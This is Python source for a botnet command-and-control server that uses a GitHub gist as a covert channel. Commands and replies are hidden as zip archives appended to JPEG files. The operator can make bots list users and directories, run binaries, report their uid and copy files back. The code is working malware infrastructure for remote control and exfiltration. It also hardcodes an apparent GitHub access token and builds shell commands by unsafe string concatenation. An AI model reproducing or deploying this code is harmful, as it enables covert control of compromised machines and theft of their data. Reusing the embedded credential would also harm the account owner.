
import os
import time
from git import Git


class CC:
    """
            # C&C server class.
    """
    def __init__(self, gitdir):
        """
        :param gitdir: directory of gist.github repository.
        """
        self.git_dir = gitdir
        self.bots_dict = {}  # dictionary of bots: key ~ botname, value ~ last cmd id

    def decode_file(self, filename):
        """
        Decodes given image into image and file.
        Encoded file bot-->C&C '<kniht/bishop>_<botname>.jpeg'.
        :param filename: jpeg file.
        """
        print("Decoding " + filename + ".\n")
        os.system("unzip " + self.git_dir + "/" + filename)
        os.system("cd " + self.git_dir + "; git rm " + filename + "&> /dev/null")

    def encode_file(self, filename):
        """
        Encodes given file into image.
        Encoded file C&C-->bot 'tower.jpeg'.
        Empty image is always 'archer.jpeg'.
        :param filename: filename to be encoded.
        """
        print("Encoding " + filename + ".\n")
        os.system("zip -r tmp.zip " + filename)
        os.system("cat " + self.git_dir + "/archer.jpeg tmp.zip > " + self.git_dir +
                  "/tower.jpeg")
        os.system("rm tmp.zip")

    def data2tower(self, data):
        """
        Converts list of data into file and calls image-encoding function.
        :param data: list of data: [cmd type, current id, msg string].
        """
        print("Converting data to tower.jpeg.\n")
        os.system("touch tower.txt")
        bot_file = open("tower.txt", 'w')
        bot_file.writelines("%s\n" % line for line in data)  # Write msg to txt file.
        bot_file.close()
        self.encode_file("tower.txt")  # Encode txt file into image.
        os.system("rm tower.txt")

    def read_knight_from_bot(self, botname):
        """
        Reads data from bot. Calls decoding funcito to convert
        image to txt file and read the content to list.
        :param botname: string name of the bot.
        :return: list of data rcved from bot.
        """
        print("Reading data from bot (" + botname + ").\n")
        self.decode_file("knight_" + botname + ".jpeg")
        knight = open("knight.txt", 'r')
        data = knight.readlines()
        knight.close()
        os.system("rm knight.txt")
        return data

    def update_bots_dict(self):
        """
        When new bot writes its name into PlayersList.txt,
        the method updates dictionary of bots.
        """
        print("Updating bots dictionary.\n")
        f = open(self.git_dir + "/PlayersList.txt", "r")
        lines = f.readlines()
        bots = list(map(lambda x: x.split()[0], lines))
        for bot in bots:
            if bot not in self.bots_dict.keys():
                self.bots_dict[bot] = 0


def main(git_dir, token, url):
    """
    Main function of C&C server.
    :param git_dir: directory of gist.github repository.
    :param token: token of github account.
    :param url: url to gist.github repository.
    """

    communication = Git(token, url, git_dir)  # Establish communication.
    communication.clone()  # Clone gist.github repository.
    cc = CC(git_dir)  # Establish C&C server.

    help_msg = """possible commands: \n
                  logged users:       <botname> 1 \n
                  list dir (ls):      <botname> 2 <path to dir> \n
                  list dir (ls -a):   <botname> 21 <path to dir> \n
                  list of bots:       bots \n
                  run binary:         <botname> 3 <path to binary> \n
                  copy file:          <botname> 4 <path to file> \n
                  current user's uid: <botname> 5 \n
                  help message:       help \n
                  terminate:          terminate \n
               """

    print(help_msg)

    while True:  # Main loop.
        communication.pull()   # Download actual version of repository.
        cc.update_bots_dict()  # Update dictionary of bot's names.
        cmd = input("\nPaste command from the table: ").split(" ")  # Take input command from user.

        if len(cmd) == 1:
            if cmd[0] == "help":  # Print help table.
                print(help_msg)
            if cmd[0] == "bots":  # Print list of bot's names.
                print(list(cc.bots_dict.keys()))
            if cmd[0] == "terminate":  # Terminate C&C and all bots.
                os.system(": > " + git_dir + "/PlayersList.txt")
                communication.push("PlayersList.txt")
                # Delete temporary files.
                if "tower.jpeg" in os.listdir(git_dir):
                    os.system("cd " + git_dir + "; git rm tower.jpeg")
                    communication.push_all()
                os.system("rm -rf " + git_dir)
                break
        elif len(cmd) in [2, 3]:  # Run commands to bot's.
            if int(cmd[1]) in [1, 2, 21, 3, 4, 5]:
                print("Performing command.\n")

                # Create list msg.
                data = None
                if len(cmd) == 2:
                    if cmd[0] in cc.bots_dict.keys():
                        data = [cmd[0], str(cc.bots_dict[cmd[0]]), cmd[1]]
                if len(cmd) == 3:
                    if cmd[0] in cc.bots_dict.keys():
                        data = [cmd[0], str(cc.bots_dict[cmd[0]]), cmd[1], cmd[2]]

                # Encode msg and send it to the bots (broadcast).
                cc.data2tower(data)
                communication.push("tower.jpeg")
                print("Data to bot sent.\n")

                # Rcv return msg from bot (unicast).
                bot_cmd_id = -1
                bot_data = None
                while bot_cmd_id != cc.bots_dict[cmd[0]]:  # Perform loop until msg is rcved.
                    time.sleep(1)  # Sleep to avoid collisions and to avoid overloading.
                    communication.pull()  # Download actual version of repository.
                    if "knight_" + cmd[0] + ".jpeg" in os.listdir(git_dir):  # Rcv msg as data list.
                        print("Data from bot loaded.\n")
                        bot_data = cc.read_knight_from_bot(cmd[0])  # Extract data from image.
                        communication.push_all()  # Actualise repository.
                        bot_cmd_id = int(bot_data[1])
                    if "bishop_" + cmd[0] + ".jpeg" in os.listdir(git_dir):  # Rcv msg as file.
                        print("Data from bot loaded.\n")
                        cc.decode_file("bishop_" + cmd[0] + ".jpeg")  # Extract file from image.
                        communication.push_all()  # Actualise repository.
                        bot_cmd_id = cc.bots_dict[cmd[0]]
                        bot_data = [0, 0, "copy of " + cmd[2] + " to the directory of cc.py done "]

                # Print return message list.
                print("----------------------------")
                print("Return message: ")
                print(list(map(lambda x: x[:-1], bot_data[2:])))
                print("----------------------------")

                # Increment last cmd id for particular bot.
                cc.bots_dict[cmd[0]] += 1


if __name__ == '__main__':
    main("dcf75fc08e5970c9e103a885d95fa8e6",
         "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",
         "https://gist.github.com/dcf75fc08e5970c9e103a885d95fa8e6.git")
